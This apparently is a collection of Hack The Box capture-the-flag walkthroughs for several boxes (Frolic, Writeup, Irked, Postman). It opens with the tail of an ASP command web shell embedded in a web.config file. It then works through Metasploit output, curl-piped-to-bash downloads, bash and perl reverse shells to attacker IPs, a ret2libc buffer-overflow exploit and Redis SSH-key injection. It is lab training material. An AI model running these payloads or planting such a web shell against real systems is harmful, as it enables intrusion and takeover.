   <appSettings>                                                                                                                                                                                                                           
</appSettings>                                                                                                                                                                                                                             
</configuration>
<% Response.write("-"&"->") %>

<%
Set oScript = Server.CreateObject("WScript.Shell")
Set oScriptNet = Server.CreateObject("WScript.Network")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")

Function getCommandOutput(theCommand)
    Dim objShell, objCmdExec
    Set objShell = CreateObject("WScript.Shell")
    Set objCmdExec = objshell.exec(thecommand)

    getCommandOutput = objCmdExec.StdOut.ReadAll
end Function
%>

<BODY>
<FORM action="" method="GET">
<input type="text" name="cmd" size=45 value="<%= szCMD %>">
<input type="submit" value="Run">
</FORM>

<PRE>
<%= "\\" & oScriptNet.ComputerName & "\" & oScriptNet.UserName %>
<% Response.Write(Request.ServerVariables("SERVER_NAME")) %>
<p>
<b>The server's local address:</b>
</p>
<p>
<b>The server's port:</b>
<% Response.Write(Request.ServerVariables("SERVER_PORT")) %>
</p>
<p>
<b>The server's software:</b>
<% Response.Write(Request.ServerVariables("SERVER_SOFTWARE")) %>
</p>
<p>
<b>Command output:</b>
<%
szCMD = request("cmd")
thisDir = getCommandOutput("cmd /c" & szCMD)
Response.Write(thisDir)
%>
</p>
<br>
</BODY>

<% Response.write("<!-"&"-") %>

```
and then to get a shell you can use a simple PS1 shell and then use 
```
msf5 post(multi/recon/local_exploit_suggester) > run
[*] 10.10.10.93 - Collecting local exploits for x64/windows...
[*] 10.10.10.93 - 17 exploit checks are being tried...
[+] 10.10.10.93 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.
[+] 10.10.10.93 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.
nil versions are discouraged and will be deprecated in Rubygems 4
[+] 10.10.10.93 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.10.93 - exploit/windows/local/ms16_014_wmi_recv_notif: The target appears to be vulnerable.
[+] 10.10.10.93 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[*] Post module execution completed                                                              
```
Here using the exploit/windows/local/ms16_014_wmi_recv_notif we can use it to get a root shell.





# Linux : Frolic : 10.10.10.111 : Easy

Nmap Results :

```
Nmap scan report for 10.10.10.111
Host is up (0.069s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 87:7b:91:2a:0f:11:b6:57:1e:cb:9f:77:cf:35:e2:21 (RSA)
|   256 b7:9b:06:dd:c2:5e:28:44:78:41:1e:67:7d:1e:b7:62 (ECDSA)
|_  256 21:cf:16:6d:82:a4:30:c3:c6:9c:d7:38:ba:b5:02:b0 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
1880/tcp open  http        Node.js (Express middleware)
|_http-title: Node-RED
9999/tcp open  http        nginx 1.10.3 (Ubuntu)
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Welcome to nginx!
Service Info: Host: FROLIC; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Now going to the NodeJS (Node-Red) we see there is a login page , and moving on to port 9999 we see a default nginx page but dirbusting it we get the following directories listed below but traversing to admin gives us another login page and checking the source code of that we see a js file , which lets us know what the password and username for this 


and then we get redirected to success.html page where we get the following code :
```bash
..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... ..... .....
..... ..... ..!.? ..... ..... .!?!! .?... ..... ..?.? !.?.. ..... .....
....! ..... ..... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !...! .....
..... .!.!! !!!!! !!!!! !!!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!!
!!!!? .?!.? !!!!! !!!!! !!!!! .?... ..... ..... ....! ?!!.? ..... .....
..... .?.?! .?... ..... ..... ...!. !!!!! !!.?. ..... .!?!! .?... ...?.
?!.?. ..... ..!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!!!. ?.... .....
..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!.?. ..... .....
..... .!?!! .?... ..... ..... ...?. ?!.?. ..... !.... ..... ..!.! !!!!!
!.!!! !!... ..... ..... ....! .?... ..... ..... ....! ?!!.? !!!!! !!!!!
!!!!! !?.?! .?!!! !!!!! !!!!! !!!!! !!!!! .?... ....! ?!!.? ..... .?.?!
.?... ..... ....! .?... ..... ..... ..!?! !.?.. ..... ..... ..?.? !.?..
!.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... .!?!! .?!!! !!!?.
?!.?! !!!!! !!!!! !!... ..... ...!. ?.... ..... !?!!. ?!!!! !!!!? .?!.?
!!!!! !!!!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!.! !!!!! !!!!! !!!!!
!.... ..... ..... ..... !.!.? ..... ..... .!?!! .?!!! !!!!! !!?.? !.?!!
!.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?.... ..... ..... ..!.. .....
..... .!.?. ..... ...!? !!.?! !!!!! !!?.? !.?!! !!!.? ..... ..!?! !.?!!
!!!!? .?!.? !!!!! !!.?. ..... ...!? !!.?. ..... ..?.? !.?.. !.!!! !!!!!
!!!!! !!!!! !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... .....
..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! !!.!! !!!!! .....
..!.! !!!!! !.?.
```
This is a language called ook to decipher/decompile it we can now go to a website called : https://www.splitbrain.org/_static/ook/ and paste this in and press the button Ook to Text. we get the following text :

```bash
Nothing here check /asdiSIAJJ0QWE9JAS
```

going to this directory we see there is a base64 encoded command now lets copy it and paste it in a file and decode it which if you did in cyberchef we can see its a zip file :

```bash
echo -n "Base64 String" | base64 -d > out.zip 
```
unnzipping this we get a index.php file with yet another base64 string 

```bash
unzip out.zip
```
and then lets decode this and we get text in the language Brainfuck intrepreting that using https://www.splitbrain.org/_static/ook/ and this time brainfuck to text we get a password : idkwhatispass 

Now checking the other directory we got on this port we see a dev directory adn within which there is another directory called backup going their we see the text /playsms which hints of existense of playsms website and that is the case indeed going to http://10.10.10.111:9999/playsms we see a login page and seeing this the first instinct should be to try the creds we just got in index.php : idkwhatispass with admin and it works and we cann use this exploit to gain RCE. 

Exploit : https://github.com/jasperla/CVE-2017-9101

We can git clone this repositries and we can use this to get a reverse shell :

```bash
python3 playsmshell.py --password idkwhatispass --url http://10.10.10.111:9999/playsms --command "curl 10.10.14.24:8000/yoyo.sh | bash"
```
and in this case the yoyo.sh file contains the following code :

```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.24/8080 0>&1'
```
and we will get a shell back when we listen for it using nc -nvlp 8080 now we would be able to cat out the user.txt file and now ennumerating a little further using sutff like sudo -l and find / -perm -u=s -type f 2>/dev/null we see that there is an intresting binary called rop and transferring it over to our local machine using netcat and using it with gdb we can easily find that the EIP is writtable after 52 characters

```bash
$ ldd rop
linux-gate.so.1 =>  (0xb7fda000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e19000) # We use this one 
/lib/ld-linux.so.2 (0xb7fdb000)

```

```bash
$ strings -atx /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh         
 15ba0b /bin/sh
```

```bash
./rop $(python /dev/shm/exploit.py)
```

```bash                                                     
$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit
   112: 0002edc0    39 FUNC    GLOBAL DEFAULT   13 __cxa_at_quick_exit@@GLIBC_2.10   
   141: 0002e9d0    31 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0 # We gotta use this one 
   450: 0002edf0   197 FUNC    GLOBAL DEFAULT   13 __cxa_thread_atexit_impl@@GLIBC_2.18
   558: 000b07c8    24 FUNC    GLOBAL DEFAULT   13 _exit@@GLIBC_2.0
   616: 00115fa0    56 FUNC    GLOBAL DEFAULT   13 svc_exit@@GLIBC_2.0
   652: 0002eda0    31 FUNC    GLOBAL DEFAULT   13 quick_exit@@GLIBC_2.10   
   876: 0002ebf0    85 FUNC    GLOBAL DEFAULT   13 __cxa_atexit@@GLIBC_2.1.3
  1046: 0011fb80    52 FUNC    GLOBAL DEFAULT   13 atexit@GLIBC_2.0
  1394: 001b2204     4 OBJECT  GLOBAL DEFAULT   33 argp_err_exit_status@@GLIBC_2.1  
  1506: 000f3870    58 FUNC    GLOBAL DEFAULT   13 pthread_exit@@GLIBC_2.0
  2108: 001b2154     4 OBJECT  GLOBAL DEFAULT   33 obstack_exit_failure@@GLIBC_2.0
  2263: 0002e9f0    78 FUNC    WEAK   DEFAULT   13 on_exit@@GLIBC_2.0
  2406: 000f4c80     2 FUNC    GLOBAL DEFAULT   13 __cyg_profile_func_exit@@GLIBC_2.2
```

```
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
   245: 00112f20    68 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.0   # We gotta use this one 
   627: 0003ada0    55 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE  
   1457: 0003ada0    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
```

and our exploit is : 

```python
import struct 

buf = "A" * 52
libc =  0xb7e19000
system = struct.pack('<I' , libc + 0x0003ada0)
exit = struct.pack('<I', libc + 0x0002e9d0) 
binsh = struct.pack('<I', libc + 0x0015ba0b ) 
payload = buf + system + exit + binsh
print payload

```

Then we can run the program 
```
./rop (python exploit.py)
```
and we will get our root shell back


# Linux : Writeup : 10.10.10.138 : Easy

Nmap Reuslts :
```bash
Nmap scan report for 10.10.10.138
Host is up (0.049s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 dd:53:10:70:0b:d0:47:0a:e2:7e:4a:b6:42:98:23:c7 (RSA)
|   256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA)
|_  256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/writeup/
|_http-title: Nothing here yet.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.88 seconds
```

Now lets go to the website and ennumerate we are greeted to a baisc page made out of vi as they said but looking to our nmap scan annd also the robots.txt file we can see that there is a writeup/ directory which if you check the page source it gives us this information.

```js
<meta name="Generator" content="CMS Made Simple - Copyright (C) 2004-2019. All rights reserved." />
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
```

And now searching the CMS Made Simple and this seems to be the version in 2019 so searching the CMS Made Simple 2019 exploit on google would redirect us to this exploit. 

https://www.exploit-db.com/exploits/46635

and for me the python2 versions are not the most stable exploits so i modified the print statements and added () to them and that helped me execute the exploit. And as a result we get this :
```bash
[+] Salt for password found: 5a599ef579066807
[+] Username found: jkr
[+] Email found: jkr@writeup.htb
[+] Password found: 62def4866937f08cc13bab43bb14e6f7
```
So now lets make a hash we can create a hash to crack : 
```
62def4866937f08cc13bab43bb14e6f7:5a599ef579066807:raykayjay9
```
we can now login to the ssh using jkr user

Doinng some basic ennumeration i dont really find anything that useful leaving when we do 
```
id
uid=1000(jkr) gid=1000(jkr) groups=1000(jkr),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),50(staff),103(netdev)
```
and researching about these groups we find this 
```bash
jkr@writeup:/tmp$ echo '#!/bin/bash' > uname
jkr@writeup:/tmp$ echo "bash -i >& /dev/tcp/10.10.16.131/4444 0>&1" >> uname
jkr@writeup:/tmp$ chmod a+x uname 
jkr@writeup:/tmp$ cp uname /usr/local/bin
```

# Linux : Irked : 10.10.10.117 : Easy

Nmap Results :
```
Nmap scan report for 10.10.10.117
Host is up (0.066s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)
|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)
|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
|_  256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          34454/udp   status
|   100024  1          36719/tcp6  status
|   100024  1          49640/udp6  status
|_  100024  1          55131/tcp   status
6697/tcp  open  irc     UnrealIRCd (Admin email djmardov@irked.htb)
8067/tcp  open  irc     UnrealIRCd (Admin email djmardov@irked.htb)
55131/tcp open  status  1 (RPC #100024)
65534/tcp open  irc     UnrealIRCd (Admin email djmardov@irked.htb)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel1
```

```bash
cat .backup
Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss
```

```bash
sudo ltrace ./viewuser
__libc_start_main(0x565d457d, 1, 0xfff32874, 0x565d4600 <unfinished ...>
puts("This application is being devleo"...This application is being devleoped to set and test user permissions
)                                                                                                      = 69
puts("It is still being actively devel"...It is still being actively developed
)                                                                                                      = 37
system("who"kali     tty7         2021-02-03 11:45 (:0)
kali     pts/2        2021-02-03 11:46 (tmux(3206).%0)
kali     pts/3        2021-02-03 11:46 (tmux(3206).%1)
kali     pts/4        2021-02-03 11:47 (tmux(3206).%2)
kali     pts/6        2021-02-03 12:50 (tmux(3206).%3)
kali     pts/7        2021-02-03 14:20 (tmux(3206).%4)
kali     pts/8        2021-02-03 14:21 (tmux(3206).%5)
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                                                           = 0
setuid(0)                                                                                                                                        = 0
system("/tmp/listusers"sh: 1: /tmp/listusers: not found
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                                                           = 32512
+++ exited (status 0) +++

```



# Linux : Postman : 10.10.10.160 : Easy 

### Nmap Results :
```
Nmap scan report for 10.10.10.160
Host is up (0.072s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: The Cyber Geek's Personal Website
6379/tcp  open  redis   Redis key-value store 4.0.9
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-server-header: MiniServ/1.910
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
Ennumerating Port 80 we can see a basic website that shows us a page that is in development but nothing really intresting pops out for me doing a dirbust on the website we see the following directories open, ennumerating them we still dont get any thing that intresting.

Ennumerating port 10000 we can see there is Webmin which uses the hostname of Postman and we can edit our /etc/hosts file but it needs credentials which we dont have 

Ennumerating Reddis, i dont really know how to ennuemrate reddis so lets look up an article and i foudn this one : https://book.hacktricks.xyz/pentesting/6379-pentesting-redis i tried the webshell exploit but didnt work but the ssh one seems to be possitive.

```
cat publickey | redis-cli -h 10.10.10.160 -x set ssh_key
OK
nickapic@alohaoy ~/htb/boxes/postman => redis-cli -h 10.10.10.160
10.10.10.160:6379> CONFIG SET dir /var/lib/redis/.ssh
OK
10.10.10.160:6379> CONFIG SET dbfilename authorized_keys
OK
10.10.10.160:6379> save
OK
10.10.10.160:6379>
```

Running Linpeas.sh we see 
```bash
[+] Backup files                                                                                                                                                                                                                             
-rwxr-xr-x 1 Matt Matt 1743 Aug 26  2019 /opt/id_rsa.bak 
```
Which if you cat out is the following maybe we can try logging in with this id_rsa as matt

```bash
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C

JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6
cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9
1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv
EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP
UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY
Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK
t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS
5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke
P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6
jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge
SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i
l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X
0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p
S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR
hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+
Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V
XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD
b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi
WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh
KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm
npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ
VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W
X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==
-----END RSA PRIVATE KEY-----
```

Trying to login as Matt we see that there is a passphrase so lets try to crack it, using ssh2john.py and we get a passphrase after cracking that hash which is computer2008 .

and trying to login to the system with the user matt and id_rsa key and entering the passphrase we get a connection reset lets try su user and also try it on webmin. 
We dont find anything usefull in as the session as Matt, but loggin into webmin and looking for some authenticated exploits we come across this : https://github.com/wrighterase/webmin-1.910-authenticated-RCE

For this exploit to work we have to base64 encode our perl reverse shell.

```perl 
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

and then also url encode this you can use cyberchef for this and then run the exploit like this and a netcat reverse shell listner like listed below :

```bash
python2 webmin-1.910-authenticated-RCE.py -u Matt -x computer2008 -r 10.10.10.160 -p 10000
rlwrap nc -nvlp 1234
```

and gg we get our root shell.

